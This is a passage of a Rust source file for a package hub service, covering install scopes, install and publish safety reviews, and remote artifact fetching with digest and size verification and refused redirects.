//! Asset hub service.

use std::borrow::Cow;
use std::collections::{BTreeSet, HashMap, HashSet};
use std::fs;
use std::io::Cursor;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use base64::Engine as _;
use image::{DynamicImage, GenericImageView, ImageFormat, imageops::FilterType};
use rand::RngExt;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};

use crate::contracts::kinds::{
    DEPENDENCY_LOCK_FILE, DependencyLockContract, DependencyLockSpec, HubPackageArtifactRef,
    HubPackageContract, HubPackageFile, HubPackageFileSupply, HubPackageInitialDataStep,
    HubPackageInitialization, HubPackageLayout, HubPackageSpec, MAX_HUB_PACKAGE_BYTES,
    MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES, PROJECT_CONFIGURATION_FILE,
    ProjectConfigurationContract, ProjectConfigurationSpec, decode_hub_package,
    decode_pipeline_graph, encode_hub_package,
};
use crate::contracts::{
    ContractDocument, ContractMetadata, decode_contract, decode_contract_value, encode_contract,
};
use crate::infra::io::durable::{atomic_write, durable_remove_file};
use crate::platform::adapters::data::DataAdapter;
use crate::platform::error::PlatformError;
use crate::platform::model::{
    CreateHubTokenRequest, CreateProjectRequest, HubAccessGrant, HubAssetGallery,
    HubAssetGalleryImage, HubAssetMedia, HubAssetPackage, HubAssetVersion, HubAuthority,
    HubPublisher, HubToken, PIPELINE_DEFINITION_EXTENSION, PlatformHubRepository,
    PlatformServiceInstance, ProjectFileLayout, ProjectHubRepository,
    ProjectRuntimeSelectionRequest, ResolvedProjectLayout, ZebflowJsonLayout, now_ts, slug_segment,
    strip_dir_prefix,
};
use crate::platform::policy::package::{
    DatabaseInitializationReport, PackagePolicyEntry, PackageReviewOptions, PackageSafetyReview,
    initial_data_engine_for_rel_path, review_package_entries, split_initial_data_sql,
};
use crate::platform::policy::report::PolicyRiskLevel;
use crate::platform::sekejap;
use crate::platform::services::project::{
    derive_trigger_kind_from_source, normalize_pipeline_file_rel_path,
};
use crate::platform::services::tsx_outline::extract_import_sources;
use crate::platform::services::{DependencyLockService, NodeRegistryService, ProjectService};
use crate::platform::sqlite_schema;
use crate::zebfs::{LocalZebFs, normalize_object_path};

pub struct HubService {
    control_data: Arc<dyn DataAdapter>,
    hub_data: Arc<dyn DataAdapter>,
    projects: Arc<ProjectService>,
    node_registry: Arc<NodeRegistryService>,
    dependency_lock: Arc<DependencyLockService>,
    data_root: PathBuf,
    install_locks: Mutex<HashMap<PathBuf, Arc<Mutex<()>>>>,
}

pub const DEFAULT_HUB_SERVICE_INSTANCE_ID: &str = "hub-default";
pub const HUB_SERVICE_KIND: &str = "hub";
const HUB_SERVICE_SCOPE_OWNER: &str = "hub-service";
const HUB_SERVICE_SCOPE_PROJECT: &str = "hub-default";
/// One package document ceiling, shared with the contract that defines it.
const MAX_REMOTE_HUB_ARTIFACT_BYTES: u64 = MAX_HUB_PACKAGE_BYTES as u64;
const DEFAULT_PUBLISHER_MAX_PACKAGES: i64 = 20;
const DEFAULT_PUBLISHER_MAX_PACKAGE_BYTES: i64 = 10 * 1024 * 1024;
const DEFAULT_PUBLISHER_MAX_MEDIA_FILES: i64 = 8;
/// The one name a locally published cover is served as.
const HUB_COVER_MEDIA_NAME: &str = "cover.webp";
const HUB_COVER_MEDIA_TYPE: &str = "image/webp";
const DEFAULT_PUBLISHER_MAX_IMAGE_BYTES: i64 = 2 * 1024 * 1024;
const HUB_ASSET_KIND_PIPELINE_BUNDLE: &str = "pipeline_bundle";
const HUB_ASSET_KIND_TEMPLATE_BUNDLE: &str = "template_bundle";
const HUB_ASSET_KIND_FOLDER_BUNDLE: &str = "folder_bundle";
const HUB_ASSET_KIND_PROJECT_BUNDLE: &str = "project_bundle";
const HUB_ASSET_KIND_NODE_BUNDLE: &str = "node_bundle";
const HUB_ASSET_KINDS: &[&str] = &[
    HUB_ASSET_KIND_PIPELINE_BUNDLE,
    HUB_ASSET_KIND_TEMPLATE_BUNDLE,
    HUB_ASSET_KIND_FOLDER_BUNDLE,
    HUB_ASSET_KIND_PROJECT_BUNDLE,
    HUB_ASSET_KIND_NODE_BUNDLE,
];

fn default_hub_base_url() -> String {
    std::env::var("ZEBFLOW_HUB_DEFAULT_BASE_URL")
        .ok()
        .map(|v| v.trim().trim_end_matches('/').to_string())
        .filter(|v| !v.is_empty())
        .unwrap_or_else(|| "https://hub.zebflow.com/api".to_string())
}

fn preserve_or_replace_token(existing: Option<&str>, incoming: &str) -> String {
    let trimmed = incoming.trim();
    if trimmed.is_empty() {
        existing.unwrap_or_default().to_string()
    } else {
        trimmed.to_string()
    }
}

fn prune_empty_hub_dirs(start: Option<&Path>, stop: &Path) {
    let Some(mut current) = start.map(Path::to_path_buf) else {
        return;
    };
    while current.starts_with(stop) && current != stop {
        match fs::remove_dir(&current) {
            Ok(()) => {}
            Err(_) => break,
        }
        let Some(parent) = current.parent() else {
            break;
        };
        current = parent.to_path_buf();
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct HubPublishSourceItem {
    pub source_type: String,
    pub source_ref: String,
    pub name: String,
    pub description: String,
    pub path: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubExportPreview {
    pub asset_kind: String,
    pub source_type: String,
    pub source_ref: String,
    pub name: String,
    pub description: String,
    pub entries: Vec<HubPackageFile>,
    pub warnings: Vec<String>,
    pub total_files: usize,
    pub total_bytes: usize,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct HubProjectBundlePublishOptions {
    #[serde(default)]
    pub include_sekejap_schema: bool,
    #[serde(default)]
    pub include_sqlite_schema: bool,
    #[serde(default)]
    pub include_libraries: Vec<String>,
    #[serde(default)]
    pub include_initial_data: bool,
    #[serde(default)]
    pub initial_data_paths: Vec<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubInstallResult {
    pub package_id: String,
    pub version: String,
    pub asset_kind: String,
    pub install_root: String,
    pub files_written: usize,
    pub pipelines_registered: Vec<String>,
}

/// Which parts of a project bundle an install is allowed to perform.
///
/// Every field defaults to true, so a caller that says nothing installs exactly
/// what it installed before this existed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct HubInstallScope {
    /// Source entries: pipelines, templates, docs -- everything the bundle
    /// carries that is neither schema nor seed SQL.
    #[serde(default = "install_scope_default")]
    pub include_code: bool,
    /// Schema and seed `.sql` files, written into `repo/`.
    #[serde(default = "install_scope_default")]
    pub include_schema: bool,
    /// Whether that SQL is replayed into the project's own stores, or left in
    /// `repo/` for the user to run themselves.
    #[serde(default = "install_scope_default")]
    pub execute_schema: bool,
}

fn install_scope_default() -> bool {
    true
}

impl Default for HubInstallScope {
    fn default() -> Self {
        Self {
            include_code: true,
            include_schema: true,
            execute_schema: true,
        }
    }
}

impl HubInstallScope {
    /// Refuses a scope that cannot mean what it says.
    ///
    /// Running SQL that is never written is not a smaller install, it is a
    /// contradiction. Answering it by quietly turning execution off would hide
    /// the disagreement from the person who asked for it.
    pub fn validate(&self) -> Result<(), PlatformError> {
        if self.execute_schema && !self.include_schema {
            return Err(PlatformError::new(
                "HUB_INSTALL_SCOPE_INVALID",
                "execute_schema requires include_schema: there is nothing to run when the \
                 schema files are not written",
            ));
        }
        if !self.include_code && !self.include_schema && !self.execute_schema {
            return Err(PlatformError::new(
                "HUB_INSTALL_SCOPE_INVALID",
                "an install with neither code nor schema would install nothing",
            ));
        }
        Ok(())
    }
}

/// What a project bundle install did, including what it deliberately did not.
///
/// A partial install must never read like a full one, so everything the scope
/// dropped is named here rather than inferred from the scope flags.
#[derive(Debug, Clone, Serialize)]
pub struct ProjectBundleInstallResult {
    pub owner: String,
    pub project: String,
    /// What the caller asked for.
    pub scope: HubInstallScope,
    /// Repository-relative destinations, in the order they were written.
    pub files_written: Vec<String>,
    /// Bundle entries the scope excluded, so they were never written.
    pub skipped_files: Vec<String>,
    /// Pipelines this install registered, by the identity they are stored under.
    pub pipelines_registered: Vec<String>,
    /// Pipelines this install activated, which is a subset of the above.
    pub pipelines_activated: Vec<String>,
    /// Pipelines the bundle names active that this install did not register, so
    /// a bundle that arrives half-activated says so instead of looking whole.
    pub pipelines_not_activated: Vec<String>,
    /// Initial-data scripts written into `repo/` and left for the user to run.
    pub unexecuted_initial_data: Vec<String>,
    /// Whether schema and seed SQL reached the project's stores.
    pub schema_executed: bool,
    /// What that SQL does, for the files this install actually wrote.
    pub database_initialization: Vec<DatabaseInitializationReport>,
}

/// What installing a project bundle would do, reported before it does any of it.
///
/// Every field above `nodes_used` is read out of the same
/// [`ProjectBundleInstallPlan`] the install executes, and is therefore the same
/// answer rather than a second prediction of it. The fields below it are the
/// package safety review, in the shape [`HubInstallReview`] reports for the
/// other install surfaces.
#[derive(Debug, Clone, Serialize)]
pub struct ProjectBundleInstallReview {
    pub package_id: String,
    pub version: String,
    pub asset_kind: String,
    /// The account the project would be created under.
    pub owner: String,
    /// The project this install would create. It does not exist yet; a name
    /// free now can be taken before the install runs, and the install then
    /// moves on to the next suffix.
    pub project: String,
    /// The consent flags this review answers for. Change them and the lists
    /// below change with them.
    pub scope: HubInstallScope,
    pub files_written: Vec<String>,
    pub skipped_files: Vec<String>,
    pub pipelines_registered: Vec<String>,
    pub pipelines_activated: Vec<String>,
    pub pipelines_not_activated: Vec<String>,
    pub schema_executed: bool,
    pub unexecuted_initial_data: Vec<String>,
    /// What the install-time SQL does, for the files this scope would write.
    pub database_initialization: Vec<DatabaseInitializationReport>,
    pub project_initialization: Value,
    pub nodes_used: Vec<String>,
    pub credentials_required: Vec<String>,
    pub external_urls: Vec<String>,
    pub database_effects: Vec<String>,
    pub filesystem_effects: Vec<String>,
    /// Node kinds that open an outbound connection, whether or not any URL is
    /// written down in a config.
    #[serde(default)]
    pub network_effects: Vec<String>,
    /// Node kinds that run code or a program the package supplied.
    #[serde(default)]
    pub code_execution: Vec<String>,
    pub public_endpoints: Vec<String>,
    pub schedules: Vec<String>,
    pub large_files: Vec<String>,
    pub seed_data: Vec<String>,
    pub warnings: Vec<String>,
    /// Findings that make this bundle uninstallable, whoever approves it.
    pub violations: Vec<String>,
    /// True when nothing blocks installation. False means the install refuses,
    /// with these same violations.
    pub installable: bool,
    pub risk_level: String,
}

struct PreparedHubInstallEntry {
    install_rel: String,
    destination: PathBuf,
    bytes: Vec<u8>,
    previous: Option<Vec<u8>>,
}

/// Directory every channel keeps its content-addressed artifacts in.
const HUB_ARTIFACT_DIR: &str = "artifacts";

/// Why a package supplied as a document body has nowhere to fetch from.
///
/// The review and the install it precedes name the same reason, so a refusal
/// reads the same whichever of the two the user reached first.
const LOCAL_NODE_BUNDLE_BODY_HAS_NO_CHANNEL: &str = "a bundle supplied as a document body says nothing about where its artifacts live; \
     install it from its file instead";

/// Where the channel a package arrived through keeps its referenced artifacts.
///
/// An artifact reference carries a digest and never a location, so the location
/// is the channel's to supply: `<channel-base>/artifacts/<sha256>`. A package
/// copied into a different repository still resolves, and two packages shipping
/// one runtime read the same file.
///
/// A channel that cannot answer says so. Every install through it then refuses
/// a referenced file rather than writing an empty one in its place.
#[derive(Debug, Clone)]
pub enum HubArtifactChannel {
    /// A directory holding `artifacts/<sha256>`: this instance's Hub store, or
    /// the folder a supplied document was read from.
    Local(PathBuf),
    /// A hub reached over HTTP, whose artifacts were fetched before this
    /// channel existed.
    Remote(RemoteHubArtifacts),
    /// This channel cannot fetch referenced bytes, and says why.
    Unresolvable(&'static str),
}

/// A remote hub's artifacts, already fetched and already verified.
///
/// The fetch happens once, before the review and therefore before the install,
/// because both must read the same bytes and neither may read a placeholder.
/// Verified bytes land in this instance's content-addressed store, so the
/// review, the install, and a second package naming the same digest all read
/// one file that was checked once.
#[derive(Debug, Clone)]
pub struct RemoteHubArtifacts {
    /// This instance's content-addressed store, where the fetch put the bytes.
    cache_base: PathBuf,
    /// The hub they came from, named in a refusal so the user knows who did
    /// not supply what.
    origin: String,
}

impl HubArtifactChannel {
    /// A channel whose artifacts sit beside `base`, under `artifacts/`.
    pub fn local(base: impl Into<PathBuf>) -> Self {
        Self::Local(base.into())
    }

    /// A channel with nowhere to look, refusing with `reason`.
    pub fn unresolvable(reason: &'static str) -> Self {
        Self::Unresolvable(reason)
    }

    /// Fetches one referenced artifact and verifies it against its digest.
    ///
    /// Nothing this returns has been written anywhere: callers resolve every
    /// reference first and write only once all of them pass, so a mismatch or a
    /// failed fetch leaves the previous state exactly as it was.
    fn resolve(
        &self,
        rel_path: &str,
        artifact: &HubPackageArtifactRef,
        declared_size_bytes: usize,
    ) -> Result<Vec<u8>, PlatformError> {
        let (base, holder) = match self {
            Self::Local(base) => (base, "this channel".to_string()),
            Self::Remote(remote) => (&remote.cache_base, remote.origin.clone()),
            Self::Unresolvable(reason) => {
                return Err(PlatformError::new(
                    "HUB_ARTIFACT_UNRESOLVED",
                    format!(
                        "file '{rel_path}' references artifact {} and {reason}",
                        artifact.sha256
                    ),
                ));
            }
        };
        if declared_size_bytes > MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_TOO_LARGE",
                format!(
                    "file '{rel_path}' declares {declared_size_bytes} bytes, over the \
                     {MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES} byte limit for a referenced artifact"
                ),
            ));
        }
        let path = referenced_artifact_path(base, &artifact.sha256)?;
        let metadata = match fs::symlink_metadata(&path) {
            Ok(metadata) => metadata,
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                return Err(PlatformError::new(
                    "HUB_ARTIFACT_MISSING",
                    format!(
                        "file '{rel_path}' references artifact {}, which {holder} does not have",
                        artifact.sha256
                    ),
                ));
            }
            Err(error) => return Err(error.into()),
        };
        if !metadata.is_file() {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_INVALID",
                format!("artifact {} is not a regular file", artifact.sha256),
            ));
        }
        if metadata.len() != declared_size_bytes as u64 {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_SIZE_MISMATCH",
                format!(
                    "file '{rel_path}' declares {declared_size_bytes} bytes but artifact {} is {} bytes",
                    artifact.sha256,
                    metadata.len()
                ),
            ));
        }
        let bytes = fs::read(&path)?;
        let actual = sha256_hex(&bytes);
        if actual != artifact.sha256 {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_DIGEST_MISMATCH",
                format!(
                    "file '{rel_path}' expects artifact {}, but the stored bytes hash to {actual}",
                    artifact.sha256
                ),
            ));
        }
        Ok(bytes)
    }
}

/// Where a document read from disk keeps its artifacts.
///
/// The review and the install must read the same directory, or a package could
/// review against bytes the install never fetches.
fn local_document_channel_base(document_path: &Path) -> PathBuf {
    document_path
        .parent()
        .unwrap_or(Path::new("."))
        .to_path_buf()
}

/// `<base>/artifacts/<sha256>`.
///
/// The digest is the whole file name, so it is checked before it becomes a path
/// segment: a reference is content-addressed and can never name a directory or
/// a neighbour.
fn referenced_artifact_path(base: &Path, sha256: &str) -> Result<PathBuf, PlatformError> {
    validate_artifact_digest(sha256)?;
    Ok(base.join(HUB_ARTIFACT_DIR).join(sha256))
}

/// A digest is 64 lowercase hexadecimal digits and nothing else.
///
/// The contract validator already refuses anything else in a decoded document.
/// This is checked again wherever a digest becomes a path segment or a URL
/// segment, because those are the two places where a wrong one would stop being
/// a name and start being a location.
fn validate_artifact_digest(sha256: &str) -> Result<(), PlatformError> {
    let valid = sha256.len() == 64
        && sha256
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte));
    if !valid {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_INVALID",
            format!("artifact digest '{sha256}' is not 64 lowercase hexadecimal digits"),
        ));
    }
    Ok(())
}

/// How long a remote artifact fetch may spend reaching the hub.
const REMOTE_ARTIFACT_CONNECT_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(10);
/// How long a fetch in progress may go without producing a byte.
///
/// A whole-request deadline cannot be used here: a 512 MB artifact on a slow
/// link is legitimate and a stalled connection is not, and only an idle timeout
/// tells the two apart.
const REMOTE_ARTIFACT_READ_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(60);

/// The client every remote artifact fetch uses.
///
/// It is deliberately not the shared platform client, because two of this
/// channel's trust decisions are client-wide. Redirects are refused rather than
/// followed, so a hub cannot hand a fetch to a host the egress check never saw;
/// and a connection that stops producing bytes fails instead of holding an
/// install open indefinitely.
///
/// A client that could not be built with that policy is not replaced by one
/// without it: the fetch refuses instead, because a fallback that quietly
/// followed redirects would be the boundary failing open.
static REMOTE_ARTIFACT_CLIENT: std::sync::LazyLock<Result<reqwest::Client, String>> =
    std::sync::LazyLock::new(|| {
        reqwest::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .connect_timeout(REMOTE_ARTIFACT_CONNECT_TIMEOUT)
            .read_timeout(REMOTE_ARTIFACT_READ_TIMEOUT)
            .build()
            .map_err(|error| error.to_string())
    });

/// Whether the store already holds these exact bytes.
///
/// A wrong-length or wrong-digest file at the content address is treated as
/// absent rather than as a failure, so a cache that was somehow corrupted heals
/// on the next fetch instead of refusing every install forever.
fn cached_artifact_matches(path: &Path, declared_size_bytes: usize, sha256: &str) -> bool {
    let Ok(metadata) = fs::symlink_metadata(path) else {
        return false;
    };
    if !metadata.is_file() || metadata.len() != declared_size_bytes as u64 {
        return false;
    }
    let Ok(mut file) = std::fs::File::open(path) else {
        return false;
    };
    let mut hasher = Sha256::new();
    let mut buffer = [0_u8; 64 * 1024];
    loop {
        match std::io::Read::read(&mut file, &mut buffer) {
            Ok(0) => break,
            Ok(read) => hasher.update(&buffer[..read]),
            Err(_) => return false,
        }
    }
    hex_lower(&hasher.finalize()) == sha256
}

/// Fetches one referenced artifact from a remote hub into `store_base`.
///
/// Nothing the remote says is taken on trust. The digest is validated before it
/// becomes a URL segment, the declared size bounds the read so a hub cannot
/// stream an unbounded body, and the bytes are hashed as they arrive. A file
/// appears at the content address only after the digest matches, so a fetch
/// that fails, stalls, overruns, or lies leaves the store exactly as it was.
async fn fetch_referenced_artifact(
    store_base: &Path,
    url: &str,
    read_token: &str,
    rel_path: &str,
    artifact: &HubPackageArtifactRef,
    declared_size_bytes: usize,
) -> Result<(), PlatformError> {
    if declared_size_bytes > MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_TOO_LARGE",
            format!(
                "file '{rel_path}' declares {declared_size_bytes} bytes, over the \
                 {MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES} byte limit for a referenced artifact"
            ),
        ));
    }
    let destination = referenced_artifact_path(store_base, &artifact.sha256)?;
    // Two releases naming one runtime cost one fetch, and a review followed by
    // the install it precedes costs one fetch between them.
    if cached_artifact_matches(&destination, declared_size_bytes, &artifact.sha256) {
        return Ok(());
    }
    validate_remote_hub_url(url)?;
    let client = REMOTE_ARTIFACT_CLIENT.as_ref().map_err(|error| {
        PlatformError::new(
            "HUB_ARTIFACT_FETCH_FAILED",
            format!("no client with the artifact fetch policy could be built: {error}"),
        )
    })?;
    let mut request = client.get(url);
    if !read_token.trim().is_empty() {
        request = request.bearer_auth(read_token.trim());
    }
    let mut response = request.send().await.map_err(|err| {
        PlatformError::new(
            "HUB_ARTIFACT_FETCH_FAILED",
            format!(
                "file '{rel_path}' references artifact {} and fetching it failed: {err}",
                artifact.sha256
            ),
        )
    })?;
    let status = response.status();
    if status.is_redirection() {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_REDIRECTED",
            format!(
                "file '{rel_path}' references artifact {}, and the hub answered {status} with a \
                 redirect; an artifact is fetched from the hub that serves it and nowhere else",
                artifact.sha256
            ),
        ));
    }
    if status == reqwest::StatusCode::NOT_FOUND || status == reqwest::StatusCode::GONE {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_MISSING",
            format!(
                "file '{rel_path}' references artifact {}, which the hub does not have ({status})",
                artifact.sha256
            ),
        ));
    }
    if status == reqwest::StatusCode::UNAUTHORIZED || status == reqwest::StatusCode::FORBIDDEN {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_FORBIDDEN",
            format!(
                "file '{rel_path}' references artifact {}, and the hub refused to serve it \
                 ({status})",
                artifact.sha256
            ),
        ));
    }
    if !status.is_success() {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_FETCH_FAILED",
            format!(
                "file '{rel_path}' references artifact {} and the hub answered {status}",
                artifact.sha256
            ),
        ));
    }
    // A declared length that disagrees with the manifest is refused before a
    // single byte of the body is read.
    if let Some(length) = response.content_length()
        && length != declared_size_bytes as u64
    {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_SIZE_MISMATCH",
            format!(
                "file '{rel_path}' declares {declared_size_bytes} bytes but the hub offers \
                 {length} bytes for artifact {}",
                artifact.sha256
            ),
        ));
    }
    let artifacts_dir = destination
        .parent()
        .map(Path::to_path_buf)
        .unwrap_or_else(|| store_base.join(HUB_ARTIFACT_DIR));
    fs::create_dir_all(&artifacts_dir)?;
    let mut staged = tempfile::Builder::new()
        .prefix(".zebflow-artifact-")
        .tempfile_in(&artifacts_dir)?;
    let mut hasher = Sha256::new();
    let mut received = 0_usize;
    loop {
        let chunk = response.chunk().await.map_err(|err| {
            PlatformError::new(
                "HUB_ARTIFACT_FETCH_FAILED",
                format!(
                    "file '{rel_path}' references artifact {} and reading it failed: {err}",
                    artifact.sha256
                ),
            )
        })?;
        let Some(chunk) = chunk else { break };
        received = received.saturating_add(chunk.len());
        if received > declared_size_bytes {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_SIZE_MISMATCH",
                format!(
                    "file '{rel_path}' declares {declared_size_bytes} bytes but the hub is still \
                     sending bytes for artifact {}",
                    artifact.sha256
                ),
            ));
        }
        hasher.update(&chunk);
        std::io::Write::write_all(staged.as_file_mut(), &chunk)?;
    }
    if received != declared_size_bytes {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_SIZE_MISMATCH",
            format!(
                "file '{rel_path}' declares {declared_size_bytes} bytes but artifact {} arrived \
                 as {received} bytes",
                artifact.sha256
            ),
        ));
    }
    let actual = hex_lower(&hasher.finalize());
    if actual != artifact.sha256 {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_DIGEST_MISMATCH",
            format!(
                "file '{rel_path}' expects artifact {}, but the fetched bytes hash to {actual}",
                artifact.sha256
            ),
        ));
    }
    std::io::Write::flush(staged.as_file_mut())?;
    // Only now, with the digest matched, do the bytes become addressable. The
    // temporary file is removed by its own drop on every path above.
    crate::infra::io::durable::durable_persist(staged, &destination)?;
    Ok(())
}

#[derive(Debug, Clone, Serialize)]
pub struct HubInstallReview {
    pub package_id: String,
    pub version: String,
    pub target_folder: String,
    pub install_root: String,
    pub asset_kind: String,
    pub files_added: Vec<String>,
    pub files_overwritten: Vec<String>,
    pub pipelines_registered: Vec<String>,
    pub nodes_used: Vec<String>,
    pub credentials_required: Vec<String>,
    pub external_urls: Vec<String>,
    pub database_effects: Vec<String>,
    pub filesystem_effects: Vec<String>,
    /// Node kinds that open an outbound connection, whether or not any URL is
    /// written down in a config.
    #[serde(default)]
    pub network_effects: Vec<String>,
    /// Node kinds that run code or a program the package supplied.
    #[serde(default)]
    pub code_execution: Vec<String>,
    pub public_endpoints: Vec<String>,
    pub schedules: Vec<String>,
    pub large_files: Vec<String>,
    pub seed_data: Vec<String>,
    /// What the package's install-time SQL does, file by file.
    #[serde(default)]
    pub database_initialization: Vec<DatabaseInitializationReport>,
    pub project_initialization: serde_json::Value,
    pub warnings: Vec<String>,
    /// Findings that make this package uninstallable, whoever approves it.
    #[serde(default)]
    pub violations: Vec<String>,
    /// True when nothing blocks installation. False means the Add action must
    /// be refused rather than confirmed.
    pub installable: bool,
    pub risk_level: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubPublishReview {
    pub package_id: String,
    pub version: String,
    pub asset_kind: String,
    pub source_type: String,
    pub source_ref: String,
    pub title: String,
    pub description: String,
    pub visibility: String,
    pub tags: Vec<String>,
    pub total_files: usize,
    pub total_bytes: usize,
    pub files: Vec<HubPackageFile>,
    pub media: Vec<HubPublishMediaReview>,
    pub nodes_used: Vec<String>,
    pub credentials_required: Vec<String>,
    pub external_urls: Vec<String>,
    pub database_effects: Vec<String>,
    pub filesystem_effects: Vec<String>,
    /// Node kinds that open an outbound connection, whether or not any URL is
    /// written down in a config.
    #[serde(default)]
    pub network_effects: Vec<String>,
    /// Node kinds that run code or a program the package supplied.
    #[serde(default)]
    pub code_execution: Vec<String>,
    pub public_endpoints: Vec<String>,
    pub schedules: Vec<String>,
    pub large_files: Vec<String>,
    pub seed_data: Vec<String>,
    /// What the package's install-time SQL does, file by file.
    #[serde(default)]
    pub database_initialization: Vec<DatabaseInitializationReport>,
    pub project_initialization: serde_json::Value,
    pub warnings: Vec<String>,
    /// Findings no approval overrides, in the same tier the install review uses.
    #[serde(default)]
    pub violations: Vec<String>,
    pub risk_level: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubPublishMediaReview {
    pub name: String,
    pub role: String,
    pub content_type: String,
    pub size_bytes: usize,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubRemotePackRow {
    pub repository_id: String,
    pub repository_title: String,
    pub package_id: String,
    #[serde(skip_serializing_if = "String::is_empty")]
    pub publisher_owner: String,
    pub publisher_id: String,
    pub publisher_display_name: String,
    pub publisher_url: String,
    #[serde(skip_serializing_if = "String::is_empty")]
    pub publisher_email: String,
    pub asset_kind: String,
    pub title: String,
    pub description: String,
    pub summary: String,
    pub image_url: String,
    pub gallery: Value,
    pub visibility: String,
    pub tags: Vec<String>,
    pub latest_version: String,
    pub updated_at: i64,
    pub source: String,
}

#[derive(Debug, Clone, Deserialize)]
struct RemoteHubListResponse {
    items: Vec<RemoteHubAssetItem>,
}

#[derive(Debug, Clone, Deserialize)]
struct RemoteHubAssetItem {
    package_id: String,
    #[serde(default)]
    publisher_owner: String,
    #[serde(default)]
    publisher_id: String,
    #[serde(default)]
    publisher_display_name: String,
    #[serde(default)]
    publisher_url: String,
    #[serde(default)]
    publisher_email: String,
    asset_kind: String,
    title: String,
    description: String,
    #[serde(default)]
    summary: String,
    #[serde(default)]
    image_url: String,
    #[serde(default)]
    gallery: Value,
    visibility: String,
    #[serde(default)]
    tags: Vec<String>,
    #[serde(default)]
    latest_version: String,
    #[serde(default)]
    updated_at: i64,
}

#[derive(Debug, Clone, Deserialize)]
struct RemoteHubArtifactResponse {
    version: RemoteHubAssetVersion,
    #[serde(default)]
    artifact_sha256: String,
    #[serde(default)]
    artifact_size_bytes: u64,
    artifact: Value,
}

#[derive(Debug, Clone, Deserialize)]
struct RemoteHubAssetVersion {
    #[serde(default)]
    artifact_sha256: String,
}

/// One outward publish: an immutable release document plus the mutable
/// presentation that is stored beside it.
///
/// Presentation rides on the request rather than inside `artifact`, because
/// `artifact` is the release: it is digest-pinned and a listing detail must not
/// be able to change it.
#[derive(Debug, Clone, serde::Serialize, Deserialize)]
pub struct RemoteHubPublishRequest {
    pub package_id: String,
    pub version: String,
    #[serde(default)]
    pub title: String,
    #[serde(default)]
    pub description: String,
    /// Listing summary. Presentation, stored beside the release.
    #[serde(default)]
    pub summary: String,
    /// Long-form markdown. Presentation, stored beside the release.
    #[serde(default)]
    pub description_md: String,
    /// Presentation images, stored as content-addressed artifacts.
    #[serde(default)]
    pub media: Vec<RemoteHubPublishMedia>,
    /// Cover and gallery entries referencing `media` by name.
    #[serde(default)]
    pub gallery: HubAssetGallery,
    #[serde(default)]
    pub visibility: String,
    #[serde(default)]
    pub tags: Vec<String>,
    /// Provenance, kept by the receiving instance and never re-published.
    pub source_owner: String,
    pub source_project: String,
    pub source_kind: String,
    pub source_ref: String,
    pub artifact: Value,
}

/// One edit to the mutable half of a package.
///
/// Every field is optional and an absent field means *leave it alone*: this is
/// the route that exists so correcting a description costs an update rather
/// than a version bump, and an edit that silently blanked what it did not
/// mention would reintroduce exactly that cost.
#[derive(Debug, Clone, Default, serde::Serialize, Deserialize)]
pub struct HubPresentationUpdate {
    /// One-line listing summary.
    #[serde(default)]
    pub summary: Option<String>,
    /// Long-form markdown shown on the package page.
    #[serde(default)]
    pub description_md: Option<String>,
    /// A project-relative image path to convert and store as the new cover.
    #[serde(default)]
    pub image_file_path: Option<String>,
    /// Cover and gallery entries, referencing media the package already has.
    #[serde(default)]
    pub gallery: Option<HubAssetGallery>,
}

/// The mutable half of a package, carried from the row that exists to the row
/// being written.
///
/// Presentation lives beside the releases so a typo costs an update rather than
/// a version bump. That only holds if a publish which says nothing about
/// presentation leaves it exactly as it found it, which is what this carries.
#[derive(Debug, Clone, Default)]
struct HubPresentation {
    summary: String,
    description_md: String,
    image_url: String,
    media: Vec<HubAssetMedia>,
    gallery: HubAssetGallery,
}

impl HubPresentation {
    fn from_existing(existing: Option<&HubAssetPackage>) -> Self {
        let Some(package) = existing else {
            return Self::default();
        };
        Self {
            summary: package.summary.clone(),
            description_md: package.description_md.clone(),
            image_url: package.image_url.clone(),
            media: package.media.clone(),
            gallery: package.gallery.clone(),
        }
    }

    /// Fold a newly supplied cover in, replacing the cover and nothing else.
    ///
    /// Other media and other gallery entries belong to the package rather than
    /// to the release being published, so they survive; a publish that carries
    /// no cover of its own leaves the current one in place. The alt text is
    /// kept because it describes the package, not the image bytes.
    fn replace_cover(&mut self, package_id: &str, cover: Option<HubAssetMedia>) {
        let Some(cover) = cover else {
            return;
        };
        let alt = self
            .gallery
            .cover
            .as_ref()
            .map(|item| item.alt.clone())
            .unwrap_or_default();
        self.media.retain(|item| item.role != "cover");
        self.media.insert(0, cover.clone());
        self.gallery.cover = Some(HubAssetGalleryImage {
            kind: "image".to_string(),
            media_name: cover.name.clone(),
            alt,
        });
